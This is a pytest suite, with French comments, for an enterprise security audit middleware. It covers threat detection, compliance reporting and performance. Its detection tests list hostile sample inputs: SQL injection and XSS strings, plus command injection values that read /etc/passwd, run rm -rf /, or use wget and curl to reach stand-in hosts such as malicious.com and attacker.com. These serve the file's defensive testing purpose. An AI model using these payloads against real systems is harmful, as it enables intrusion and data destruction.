"""
Tests Ultra-Avancés pour Security Audit Middleware Enterprise
==========================================================

Tests industriels complets pour sécurité avancée avec détection de menaces,
compliance GDPR/SOX/HIPAA, threat intelligence, et patterns de test enterprise.

Développé par l'équipe Test Engineering Expert sous la direction de Fahed Mlaiel.
Architecture: Enterprise Security Testing Framework avec Zero Trust validation.
"""

import pytest
import asyncio
import time
import json
import hashlib
import hmac
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from typing import Dict, Any, List, Optional
from datetime import datetime, timedelta
import numpy as np
from concurrent.futures import ThreadPoolExecutor
import ipaddress
import base64
import jwt
from cryptography.fernet import Fernet

# Import du middleware à tester
from app.api.middleware.security_audit_middleware import (
    SecurityAuditMiddleware,
    ThreatDetectionEngine,
    ComplianceMonitor,
    SecurityAuditLogger,
    ZeroTrustValidator,
    ThreatIntelligenceClient,
    SecurityMetrics,
    SecurityIncident,
    create_security_audit_middleware,
    SecurityConfig,
    ThreatLevel,
    ComplianceFramework,
    SecurityEventType,
    RiskScore,
    SecurityPolicy
)


# =============================================================================
# FIXTURES ENTERPRISE POUR SECURITY TESTING
# =============================================================================

@pytest.fixture
def security_config():
    """Configuration enterprise sécurité pour tests."""
    return SecurityConfig(
        threat_detection_enabled=True,
        threat_intelligence_enabled=True,
        compliance_monitoring_enabled=True,
        audit_logging_enabled=True,
        zero_trust_enabled=True,
        threat_intelligence_feeds=[
            "https://feeds.threatintel.com/indicators",
            "https://api.abuse.ch/api/",
            "https://otx.alienvault.com/api/v1/"
        ],
        compliance_frameworks=[
            ComplianceFramework.GDPR,
            ComplianceFramework.SOX,
            ComplianceFramework.HIPAA,
            ComplianceFramework.PCI_DSS
        ],
        max_login_attempts=5,
        session_timeout_minutes=30,
        password_policy={
            'min_length': 12,
            'require_uppercase': True,
            'require_lowercase': True,
            'require_numbers': True,
            'require_special_chars': True,
            'max_age_days': 90
        },
        encryption_key="32_byte_encryption_key_for_tests",
        security_headers_enabled=True,
        ip_whitelist_enabled=False,
        geo_blocking_enabled=True,
        rate_limiting_enabled=True
    )

@pytest.fixture
def mock_threat_intelligence():
    """Mock client threat intelligence."""
    client = Mock()
    
    # Base de données de menaces simulée
    threat_indicators = {
        '192.168.1.100': {
            'type': 'malicious_ip',
            'risk_score': 85,
            'last_seen': datetime.now() - timedelta(hours=2),
            'sources': ['abuse.ch', 'threatintel.com']
        },
        'malware.example.com': {
            'type': 'malicious_domain',
            'risk_score': 95,
            'last_seen': datetime.now() - timedelta(minutes=30),
            'sources': ['virustotal', 'otx.alienvault']
        },
        'user-agent-malware/1.0': {
            'type': 'malicious_user_agent',
            'risk_score': 75,
            'last_seen': datetime.now() - timedelta(hours=1),
            'sources': ['custom_feeds']
        }
    }
    
    async def check_threat_indicator(indicator, indicator_type):
        return threat_indicators.get(indicator)
    
    async def bulk_check_indicators(indicators):
        results = {}
        for indicator in indicators:
            threat = threat_indicators.get(indicator)
            if threat:
                results[indicator] = threat
        return results
    
    client.check_threat_indicator = check_threat_indicator
    client.bulk_check_indicators = bulk_check_indicators
    client.get_threat_feeds.return_value = list(threat_indicators.values())
    
    return client

@pytest.fixture
def mock_geoip_database():
    """Mock base de données GeoIP."""
    geoip = Mock()
    
    # Base de données géographique simulée
    ip_locations = {
        '192.168.1.100': {
            'country': 'US',
            'region': 'California',
            'city': 'San Francisco',
            'latitude': 37.7749,
            'longitude': -122.4194,
            'is_anonymous_proxy': False,
            'is_satellite_provider': False
        },
        '10.0.0.1': {
            'country': 'CN',
            'region': 'Beijing',
            'city': 'Beijing',
            'latitude': 39.9042,
            'longitude': 116.4074,
            'is_anonymous_proxy': False,
            'is_satellite_provider': False
        },
        '203.0.113.0': {
            'country': 'RU',
            'region': 'Moscow',
            'city': 'Moscow',
            'latitude': 55.7558,
            'longitude': 37.6173,
            'is_anonymous_proxy': True,  # Proxy suspect
            'is_satellite_provider': False
        }
    }
    
    def get_location(ip):
        return ip_locations.get(ip, {
            'country': 'Unknown',
            'region': 'Unknown',
            'city': 'Unknown',
            'is_anonymous_proxy': False,
            'is_satellite_provider': False
        })
    
    geoip.get_location = get_location
    return geoip

@pytest.fixture
async def security_middleware(security_config, mock_threat_intelligence, mock_geoip_database):
    """Middleware de sécurité configuré pour tests."""
    with patch('app.api.middleware.security_audit_middleware.ThreatIntelligenceClient',
               return_value=mock_threat_intelligence), \
         patch('app.api.middleware.security_audit_middleware.GeoIPDatabase',
               return_value=mock_geoip_database):
        
        middleware = SecurityAuditMiddleware(security_config)
        await middleware.initialize()
        yield middleware
        await middleware.cleanup()

@pytest.fixture
def malicious_request():
    """Requête malveillante pour tests."""
    request = Mock()
    request.method = "POST"
    request.url = Mock()
    request.url.path = "/api/v1/admin/users"
    request.url.scheme = "https"
    request.headers = {
        "User-Agent": "user-agent-malware/1.0",  # User agent malveillant
        "X-Forwarded-For": "192.168.1.100",     # IP malveillante
        "Content-Type": "application/json",
        "Authorization": "Bearer invalid_token"
    }
    request.client = Mock()
    request.client.host = "192.168.1.100"  # IP malveillante
    request.body = b'{"username": "admin\'; DROP TABLE users; --", "password": "password"}'
    request.state = Mock()
    
    return request

@pytest.fixture
def legitimate_request():
    """Requête légitime pour tests."""
    request = Mock()
    request.method = "GET"
    request.url = Mock()
    request.url.path = "/api/v1/users/profile"
    request.url.scheme = "https"
    request.headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Authorization": "Bearer valid_jwt_token_here",
        "Content-Type": "application/json",
        "X-Request-ID": "req_12345"
    }
    request.client = Mock()
    request.client.host = "203.0.113.50"  # IP légitime
    request.state = Mock()
    
    return request


# =============================================================================
# TESTS FONCTIONNELS ENTERPRISE
# =============================================================================

class TestSecurityAuditMiddlewareFunctionality:
    """Tests fonctionnels complets du middleware de sécurité."""
    
    @pytest.mark.asyncio
    async def test_middleware_initialization(self, security_config):
        """Test d'initialisation complète du middleware."""
        middleware = SecurityAuditMiddleware(security_config)
        
        # Vérifier l'état initial
        assert middleware.config == security_config
        assert not middleware.is_initialized
        
        # Initialiser avec mocks
        with patch('app.api.middleware.security_audit_middleware.ThreatIntelligenceClient'), \
             patch('app.api.middleware.security_audit_middleware.GeoIPDatabase'):
            
            await middleware.initialize()
            
            # Vérifier l'initialisation
            assert middleware.is_initialized
            assert middleware.threat_detection_engine is not None
            assert middleware.compliance_monitor is not None
            assert middleware.audit_logger is not None
            assert middleware.zero_trust_validator is not None
            
            await middleware.cleanup()
    
    @pytest.mark.asyncio
    async def test_threat_detection_malicious_request(self, security_middleware, malicious_request):
        """Test de détection de requête malveillante."""
        # Analyser la requête
        security_analysis = await security_middleware.analyze_request_security(malicious_request)
        
        # Vérifier la détection
        assert security_analysis is not None
        assert security_analysis['risk_score'] > 70  # Score de risque élevé
        assert security_analysis['threats_detected'] > 0
        
        # Vérifier les menaces spécifiques
        threats = security_analysis['detected_threats']
        
        # Doit détecter l'IP malveillante
        ip_threat = next((t for t in threats if t['type'] == 'malicious_ip'), None)
        assert ip_threat is not None
        assert ip_threat['indicator'] == '192.168.1.100'
        
        # Doit détecter le User-Agent malveillant
        ua_threat = next((t for t in threats if t['type'] == 'malicious_user_agent'), None)
        assert ua_threat is not None
        assert ua_threat['indicator'] == 'user-agent-malware/1.0'
        
        # Doit détecter l'injection SQL
        sql_threat = next((t for t in threats if t['type'] == 'sql_injection'), None)
        assert sql_threat is not None
    
    @pytest.mark.asyncio
    async def test_legitimate_request_processing(self, security_middleware, legitimate_request):
        """Test de traitement de requête légitime."""
        # Analyser la requête légitime
        security_analysis = await security_middleware.analyze_request_security(legitimate_request)
        
        # Vérifier que c'est considéré comme sûr
        assert security_analysis['risk_score'] < 30  # Score de risque faible
        assert security_analysis['threats_detected'] == 0
        assert security_analysis['action_recommended'] == 'allow'
        
        # Vérifier l'audit
        audit_records = security_middleware.get_recent_audit_records()
        assert len(audit_records) > 0
        
        latest_audit = audit_records[-1]
        assert latest_audit['risk_level'] == 'LOW'
        assert latest_audit['action_taken'] == 'ALLOWED'
    
    @pytest.mark.asyncio
    async def test_zero_trust_validation(self, security_middleware, legitimate_request):
        """Test de validation Zero Trust."""
        # Simuler un contexte utilisateur
        user_context = {
            'user_id': '12345',
            'roles': ['user', 'premium'],
            'last_login': datetime.now() - timedelta(hours=1),
            'device_fingerprint': 'device_123',
            'location_history': ['US', 'US', 'US'],
            'risk_score': 15
        }
        
        # Validation Zero Trust
        zt_result = await security_middleware.validate_zero_trust(
            legitimate_request, user_context
        )
        
        assert zt_result is not None
        assert zt_result['trust_score'] > 70  # Score de confiance élevé
        assert zt_result['access_granted'] is True
        assert 'validation_factors' in zt_result
        
        # Vérifier les facteurs de validation
        factors = zt_result['validation_factors']
        assert 'device_trust' in factors
        assert 'location_trust' in factors
        assert 'behavioral_trust' in factors
        assert 'credential_trust' in factors
    
    @pytest.mark.asyncio
    async def test_compliance_monitoring_gdpr(self, security_middleware):
        """Test de monitoring de conformité GDPR."""
        # Simuler des événements GDPR
        gdpr_events = [
            {
                'type': 'data_access',
                'user_id': '12345',
                'data_types': ['personal_info', 'contact_details'],
                'legal_basis': 'consent',
                'purpose': 'service_provision'
            },
            {
                'type': 'data_processing',
                'user_id': '12345',
                'data_types': ['behavioral_data'],
                'legal_basis': 'legitimate_interest',
                'purpose': 'analytics'
            },
            {
                'type': 'data_deletion',
                'user_id': '67890',
                'data_types': ['all'],
                'reason': 'user_request',
                'retention_period_expired': False
            }
        ]
        
        for event in gdpr_events:
            await security_middleware.record_gdpr_event(event)
        
        # Générer un rapport de conformité GDPR
        gdpr_report = security_middleware.generate_gdpr_compliance_report()
        
        assert 'data_processing_summary' in gdpr_report
        assert 'consent_tracking' in gdpr_report
        assert 'retention_compliance' in gdpr_report
        assert 'user_rights_requests' in gdpr_report
        
        # Vérifier les détails
        processing_summary = gdpr_report['data_processing_summary']
        assert len(processing_summary) >= 2  # Au moins 2 événements de traitement
        
        # Vérifier le tracking des droits utilisateur
        rights_requests = gdpr_report['user_rights_requests']
        deletion_requests = [r for r in rights_requests if r['type'] == 'data_deletion']
        assert len(deletion_requests) >= 1
    
    @pytest.mark.asyncio
    async def test_security_incident_management(self, security_middleware, malicious_request):
        """Test de gestion des incidents de sécurité."""
        # Provoquer un incident de sécurité
        security_analysis = await security_middleware.analyze_request_security(malicious_request)
        
        # Un incident doit être créé automatiquement
        incidents = security_middleware.get_active_security_incidents()
        assert len(incidents) > 0
        
        # Vérifier les détails de l'incident
        incident = incidents[-1]  # Le plus récent
        assert incident['severity'] in ['HIGH', 'CRITICAL']
        assert incident['status'] == 'ACTIVE'
        assert incident['threat_indicators'] is not None
        assert len(incident['threat_indicators']) > 0
        
        # Enrichir l'incident avec des informations supplémentaires
        await security_middleware.enrich_security_incident(
            incident['incident_id'],
            {
                'analyst_notes': 'Multiple threat indicators detected',
                'impact_assessment': 'Potential data breach attempt',
                'recommended_actions': ['block_ip', 'alert_soc_team']
            }
        )
        
        # Vérifier l'enrichissement
        updated_incident = security_middleware.get_security_incident(incident['incident_id'])
        assert 'analyst_notes' in updated_incident
        assert 'impact_assessment' in updated_incident
        assert 'recommended_actions' in updated_incident


# =============================================================================
# TESTS DE DETECTION DE MENACES AVANCEES
# =============================================================================

class TestAdvancedThreatDetection:
    """Tests de détection de menaces avancées."""
    
    @pytest.mark.asyncio
    async def test_sql_injection_detection(self, security_middleware):
        """Test de détection d'injection SQL."""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/**/OR/**/1=1--",
            "'; EXEC xp_cmdshell('dir'); --",
            "1; DELETE FROM users WHERE 1=1; --",
            "' UNION SELECT password FROM users WHERE username='admin'--"
        ]
        
        for payload in sql_payloads:
            # Créer une requête avec payload SQL
            request = Mock()
            request.method = "POST"
            request.url = Mock()
            request.url.path = "/api/v1/login"
            request.headers = {"Content-Type": "application/json"}
            request.body = json.dumps({"username": payload, "password": "test"}).encode()
            request.client = Mock()
            request.client.host = "127.0.0.1"
            
            # Analyser la sécurité
            analysis = await security_middleware.analyze_request_security(request)
            
            # Doit détecter l'injection SQL
            assert analysis['risk_score'] > 80
            sql_threats = [t for t in analysis['detected_threats'] 
                          if t['type'] == 'sql_injection']
            assert len(sql_threats) > 0
            
            # Vérifier les détails de la menace
            sql_threat = sql_threats[0]
            assert sql_threat['confidence'] > 0.8
            assert 'payload' in sql_threat['details']
    
    @pytest.mark.asyncio
    async def test_xss_detection(self, security_middleware):
        """Test de détection XSS."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        for payload in xss_payloads:
            # Créer une requête avec payload XSS
            request = Mock()
            request.method = "POST"
            request.url = Mock()
            request.url.path = "/api/v1/comments"
            request.headers = {"Content-Type": "application/json"}
            request.body = json.dumps({"comment": payload}).encode()
            request.client = Mock()
            request.client.host = "127.0.0.1"
            
            # Analyser la sécurité
            analysis = await security_middleware.analyze_request_security(request)
            
            # Doit détecter l'XSS
            assert analysis['risk_score'] > 70
            xss_threats = [t for t in analysis['detected_threats'] 
                          if t['type'] == 'xss_injection']
            assert len(xss_threats) > 0
    
    @pytest.mark.asyncio
    async def test_command_injection_detection(self, security_middleware):
        """Test de détection d'injection de commandes."""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; wget http://malicious.com/shell.sh",
            "$(curl attacker.com)",
            "`whoami`"
        ]
        
        for payload in command_payloads:
            # Créer une requête avec payload de commande
            request = Mock()
            request.method = "POST"
            request.url = Mock()
            request.url.path = "/api/v1/system/backup"
            request.headers = {"Content-Type": "application/json"}
            request.body = json.dumps({"filename": f"backup{payload}"}).encode()
            request.client = Mock()
            request.client.host = "127.0.0.1"
            
            # Analyser la sécurité
            analysis = await security_middleware.analyze_request_security(request)
            
            # Doit détecter l'injection de commande
            assert analysis['risk_score'] > 75
            cmd_threats = [t for t in analysis['detected_threats'] 
                          if t['type'] == 'command_injection']
            assert len(cmd_threats) > 0
    
    @pytest.mark.asyncio
    async def test_brute_force_detection(self, security_middleware):
        """Test de détection d'attaque par force brute."""
        # Simuler des tentatives de connexion répétées
        failed_attempts = []
        
        for i in range(10):  # 10 tentatives en peu de temps
            request = Mock()
            request.method = "POST"
            request.url = Mock()
            request.url.path = "/api/v1/auth/login"
            request.headers = {"Content-Type": "application/json"}
            request.body = json.dumps({
                "username": "admin",
                "password": f"wrongpassword{i}"
            }).encode()
            request.client = Mock()
            request.client.host = "192.168.1.50"
            
            # Enregistrer la tentative d'authentification échouée
            await security_middleware.record_authentication_attempt(
                request, success=False, username="admin"
            )
            
            # Analyser après chaque tentative
            analysis = await security_middleware.analyze_request_security(request)
            failed_attempts.append(analysis)
        
        # Les dernières tentatives doivent avoir un score de risque élevé
        recent_analysis = failed_attempts[-1]
        assert recent_analysis['risk_score'] > 85
        
        # Doit détecter l'attaque par force brute
        brute_force_threats = [t for t in recent_analysis['detected_threats'] 
                              if t['type'] == 'brute_force_attack']
        assert len(brute_force_threats) > 0
        
        # Vérifier les détails
        bf_threat = brute_force_threats[0]
        assert bf_threat['failed_attempts'] >= 5
        assert bf_threat['time_window_minutes'] <= 5


# =============================================================================
# TESTS DE CONFORMITE AVANCEE
# =============================================================================

class TestAdvancedCompliance:
    """Tests de conformité avancée pour différents frameworks."""
    
    @pytest.mark.asyncio
    async def test_sox_compliance_monitoring(self, security_middleware):
        """Test de monitoring de conformité SOX."""
        # Simuler des événements SOX (Sarbanes-Oxley)
        sox_events = [
            {
                'type': 'financial_data_access',
                'user_id': 'financial_analyst_001',
                'data_classification': 'financial',
                'access_reason': 'quarterly_report',
                'approval_required': True,
                'approver_id': 'cfo_001'
            },
            {
                'type': 'financial_data_modification',
                'user_id': 'accounting_manager_002',
                'data_classification': 'financial',
                'modification_type': 'revenue_adjustment',
                'audit_trail_required': True,
                'segregation_of_duties_verified': True
            },
            {
                'type': 'system_configuration_change',
                'user_id': 'sysadmin_003',
                'system': 'financial_reporting_system',
                'change_type': 'access_control_modification',
                'change_approval_id': 'CAB-2024-001'
            }
        ]
        
        for event in sox_events:
            await security_middleware.record_sox_event(event)
        
        # Générer un rapport de conformité SOX
        sox_report = security_middleware.generate_sox_compliance_report()
        
        assert 'access_controls' in sox_report
        assert 'segregation_of_duties' in sox_report
        assert 'audit_trail_completeness' in sox_report
        assert 'financial_data_integrity' in sox_report
        
        # Vérifier les contrôles d'accès
        access_controls = sox_report['access_controls']
        assert access_controls['privileged_access_monitored'] is True
        assert access_controls['approval_workflow_enforced'] is True
        
        # Vérifier la ségrégation des tâches
        segregation = sox_report['segregation_of_duties']
        assert len(segregation['violations']) == 0  # Aucune violation
    
    @pytest.mark.asyncio
    async def test_hipaa_compliance_monitoring(self, security_middleware):
        """Test de monitoring de conformité HIPAA."""
        # Simuler des événements HIPAA
        hipaa_events = [
            {
                'type': 'phi_access',
                'user_id': 'doctor_001',
                'patient_id': 'patient_12345',
                'phi_types': ['medical_records', 'treatment_history'],
                'access_purpose': 'treatment',
                'minimum_necessary_verified': True
            },
            {
                'type': 'phi_disclosure',
                'user_id': 'nurse_002',
                'patient_id': 'patient_12345',
                'recipient': 'specialist_clinic',
                'disclosure_purpose': 'referral',
                'patient_authorization': True
            },
            {
                'type': 'phi_breach_incident',
                'incident_id': 'BREACH-2024-001',
                'affected_patients': 150,
                'breach_type': 'unauthorized_access',
                'discovery_date': datetime.now(),
                'notification_required': True
            }
        ]
        
        for event in hipaa_events:
            await security_middleware.record_hipaa_event(event)
        
        # Générer un rapport de conformité HIPAA
        hipaa_report = security_middleware.generate_hipaa_compliance_report()
        
        assert 'phi_access_controls' in hipaa_report
        assert 'minimum_necessary_compliance' in hipaa_report
        assert 'breach_notifications' in hipaa_report
        assert 'audit_log_integrity' in hipaa_report
        
        # Vérifier les incidents de violation
        breach_notifications = hipaa_report['breach_notifications']
        assert len(breach_notifications['pending_notifications']) > 0
        
        # Vérifier les contrôles d'accès PHI
        phi_controls = hipaa_report['phi_access_controls']
        assert phi_controls['access_logging_enabled'] is True
        assert phi_controls['role_based_access_enforced'] is True
    
    @pytest.mark.asyncio
    async def test_pci_dss_compliance_monitoring(self, security_middleware):
        """Test de monitoring de conformité PCI DSS."""
        # Simuler des événements PCI DSS
        pci_events = [
            {
                'type': 'cardholder_data_access',
                'user_id': 'payment_processor_001',
                'card_data_type': 'encrypted_pan',
                'access_reason': 'transaction_processing',
                'encryption_verified': True,
                'key_management_compliant': True
            },
            {
                'type': 'network_security_scan',
                'scan_type': 'vulnerability_assessment',
                'target_systems': ['payment_gateway', 'card_data_environment'],
                'vulnerabilities_found': 2,
                'remediation_required': True
            },
            {
                'type': 'security_policy_violation',
                'violation_type': 'unencrypted_cardholder_data',
                'severity': 'HIGH',
                'system_affected': 'legacy_payment_system',
                'immediate_action_required': True
            }
        ]
        
        for event in pci_events:
            await security_middleware.record_pci_event(event)
        
        # Générer un rapport de conformité PCI DSS
        pci_report = security_middleware.generate_pci_compliance_report()
        
        assert 'cardholder_data_protection' in pci_report
        assert 'network_security' in pci_report
        assert 'vulnerability_management' in pci_report
        assert 'access_control_measures' in pci_report
        
        # Vérifier la protection des données de carte
        data_protection = pci_report['cardholder_data_protection']
        assert data_protection['encryption_at_rest'] is True
        assert data_protection['encryption_in_transit'] is True
        
        # Vérifier les violations
        violations = pci_report['policy_violations']
        high_severity_violations = [v for v in violations if v['severity'] == 'HIGH']
        assert len(high_severity_violations) > 0


# =============================================================================
# TESTS DE PERFORMANCE ET CHARGE SECURITE
# =============================================================================

class TestSecurityPerformance:
    """Tests de performance pour le système de sécurité."""
    
    @pytest.mark.asyncio
    async def test_threat_detection_latency(self, security_middleware):
        """Test de latence de détection de menaces."""
        num_requests = 100
        latencies = []
        
        for i in range(num_requests):
            # Créer une requête de test
            request = Mock()
            request.method = "GET"
            request.url = Mock()
            request.url.path = f"/api/v1/test/{i}"
            request.headers = {"User-Agent": "TestClient/1.0"}
            request.client = Mock()
            request.client.host = "127.0.0.1"
            request.body = b'{}'
            
            # Mesurer la latence de détection
            start_time = time.time()
            analysis = await security_middleware.analyze_request_security(request)
            end_time = time.time()
            
            latency = (end_time - start_time) * 1000  # En millisecondes
            latencies.append(latency)
            
            # Vérifier que l'analyse est complète
            assert analysis is not None
            assert 'risk_score' in analysis
        
        # Calculer les statistiques de latence
        avg_latency = sum(latencies) / len(latencies)
        p95_latency = np.percentile(latencies, 95)
        p99_latency = np.percentile(latencies, 99)
        
        # Assertions de performance
        assert avg_latency < 50.0  # Latence moyenne < 50ms
        assert p95_latency < 100.0  # P95 < 100ms
        assert p99_latency < 200.0  # P99 < 200ms
        
        print(f"Threat detection latency - Avg: {avg_latency:.2f}ms, P95: {p95_latency:.2f}ms, P99: {p99_latency:.2f}ms")
    
    @pytest.mark.asyncio
    async def test_concurrent_threat_analysis(self, security_middleware):
        """Test d'analyse de menaces concurrente."""
        num_concurrent = 50
        requests_per_task = 20
        
        async def analyze_batch(task_id):
            """Analyser un lot de requêtes."""
            analysis_results = []
            
            for i in range(requests_per_task):
                request = Mock()
                request.method = "POST"
                request.url = Mock()
                request.url.path = f"/api/v1/batch/{task_id}/{i}"
                request.headers = {"User-Agent": f"TestClient/{task_id}"}
                request.client = Mock()
                request.client.host = "127.0.0.1"
                request.body = json.dumps({"task_id": task_id, "item": i}).encode()
                
                analysis = await security_middleware.analyze_request_security(request)
                analysis_results.append(analysis)
            
            return analysis_results
        
        # Exécuter l'analyse concurrente
        start_time = time.time()
        tasks = [analyze_batch(i) for i in range(num_concurrent)]
        results = await asyncio.gather(*tasks)
        total_time = time.time() - start_time
        
        # Vérifier les résultats
        total_analyses = sum(len(batch) for batch in results)
        expected_analyses = num_concurrent * requests_per_task
        
        assert total_analyses == expected_analyses
        
        # Calculer le débit
        analyses_per_second = total_analyses / total_time
        assert analyses_per_second > 100  # Au moins 100 analyses/sec
        
        print(f"Concurrent threat analysis throughput: {analyses_per_second:.2f} analyses/sec")
    
    @pytest.mark.asyncio
    async def test_memory_efficiency_security(self, security_middleware):
        """Test d'efficacité mémoire du système de sécurité."""
        import psutil
        import gc
        
        initial_memory = psutil.Process().memory_info().rss
        
        # Générer beaucoup d'événements de sécurité
        for i in range(1000):
            request = Mock()
            request.method = "GET"
            request.url = Mock()
            request.url.path = f"/api/v1/memory_test/{i}"
            request.headers = {"User-Agent": "MemoryTestClient/1.0"}
            request.client = Mock()
            request.client.host = f"192.168.1.{(i % 254) + 1}"
            
            # Analyser et enregistrer
            await security_middleware.analyze_request_security(request)
            
            # Enregistrer des événements de conformité
            await security_middleware.record_gdpr_event({
                'type': 'data_access',
                'user_id': f'user_{i}',
                'data_types': ['profile'],
                'legal_basis': 'consent'
            })
            
            # Vérifier la mémoire périodiquement
            if i % 100 == 0:
                current_memory = psutil.Process().memory_info().rss
                memory_growth = current_memory - initial_memory
                
                # Pas plus de 100MB de croissance
                assert memory_growth < 100 * 1024 * 1024
        
        # Forcer le garbage collection
        gc.collect()
        
        final_memory = psutil.Process().memory_info().rss
        total_growth = final_memory - initial_memory
        
        # Croissance totale acceptable
        assert total_growth < 150 * 1024 * 1024  # Max 150MB
        
        print(f"Security system memory growth: {total_growth / 1024 / 1024:.2f} MB")


# =============================================================================
# TESTS D'INTEGRATION COMPLETE SECURITE
# =============================================================================

@pytest.mark.integration
class TestSecurityIntegrationComplete:
    """Tests d'intégration complète du système de sécurité."""
    
    @pytest.mark.asyncio
    async def test_end_to_end_security_workflow(self, security_config):
        """Test de workflow de sécurité complet."""
        with patch('app.api.middleware.security_audit_middleware.ThreatIntelligenceClient') as mock_ti, \
             patch('app.api.middleware.security_audit_middleware.GeoIPDatabase') as mock_geo:
            
            # Configuration des mocks
            mock_ti.return_value = Mock()
            mock_geo.return_value = Mock()
            
            # Initialisation complète
            middleware = SecurityAuditMiddleware(security_config)
            await middleware.initialize()
            
            try:
                # 1. Requête légitime
                legitimate_req = Mock()
                legitimate_req.method = "GET"
                legitimate_req.url = Mock()
                legitimate_req.url.path = "/api/v1/user/profile"
                legitimate_req.headers = {"User-Agent": "LegitimateClient/1.0"}
                legitimate_req.client = Mock()
                legitimate_req.client.host = "203.0.113.50"
                legitimate_req.body = b'{}'
                
                legit_analysis = await middleware.analyze_request_security(legitimate_req)
                assert legit_analysis['risk_score'] < 30
                assert legit_analysis['action_recommended'] == 'allow'
                
                # 2. Requête malveillante
                malicious_req = Mock()
                malicious_req.method = "POST"
                malicious_req.url = Mock()
                malicious_req.url.path = "/api/v1/admin/delete_all"
                malicious_req.headers = {"User-Agent": "AttackTool/1.0"}
                malicious_req.client = Mock()
                malicious_req.client.host = "192.168.1.100"  # IP suspecte
                malicious_req.body = b'{"sql": "\'; DROP TABLE users; --"}'
                
                malicious_analysis = await middleware.analyze_request_security(malicious_req)
                assert malicious_analysis['risk_score'] > 80
                assert malicious_analysis['action_recommended'] in ['block', 'quarantine']
                
                # 3. Vérifier la création d'incidents
                incidents = middleware.get_active_security_incidents()
                assert len(incidents) > 0
                
                # 4. Tester la réponse automatique
                auto_response = await middleware.execute_automatic_response(malicious_analysis)
                assert auto_response['action_taken'] in ['blocked', 'rate_limited', 'flagged']
                
                # 5. Générer des rapports de conformité
                compliance_report = middleware.generate_comprehensive_compliance_report()
                
                assert 'gdpr_compliance' in compliance_report
                assert 'sox_compliance' in compliance_report
                assert 'security_incidents_summary' in compliance_report
                assert 'threat_intelligence_summary' in compliance_report
                
                # 6. Vérifier les métriques de sécurité
                security_metrics = middleware.get_security_metrics()
                
                assert 'total_requests_analyzed' in security_metrics
                assert 'threats_detected' in security_metrics
                assert 'incidents_created' in security_metrics
                assert 'compliance_events_recorded' in security_metrics
                
                # Vérifier que toutes les métriques sont > 0
                assert security_metrics['total_requests_analyzed'] >= 2
                assert security_metrics['threats_detected'] >= 1
                
            finally:
                await middleware.cleanup()


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
